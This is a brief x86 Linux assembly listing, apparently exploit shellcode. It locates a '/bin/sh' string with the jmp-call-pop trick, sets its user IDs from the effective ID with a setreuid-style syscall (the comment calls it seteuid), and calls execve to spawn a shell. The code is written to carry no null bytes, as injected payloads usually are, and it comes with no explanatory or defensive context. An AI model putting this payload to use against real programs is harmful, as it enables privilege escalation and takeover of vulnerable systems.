jmp caller

open_shell:
    ; Get the previous instruction pointer 
    ; in order to determine our bin/bash string 
    ; location
    pop ebx
    push ebx

    ; sys_geteuid 
    xor eax, eax
    add al, 49
    int 0x80

    ; sys_seteuid (push ebx to restore it later)
    push ebx
    mov ebx, eax
    mov ecx, eax
    xor eax, eax
    add al, 70
    int 0x80
    pop ebx

    xor edx, edx
    mov [ebx + 7], edx    
    xor eax, eax
    add al, 0xb
    xor ecx, ecx
    xor edx, edx
    int 0x80

caller:
    call open_shell
    .ascii "/bin/shA"
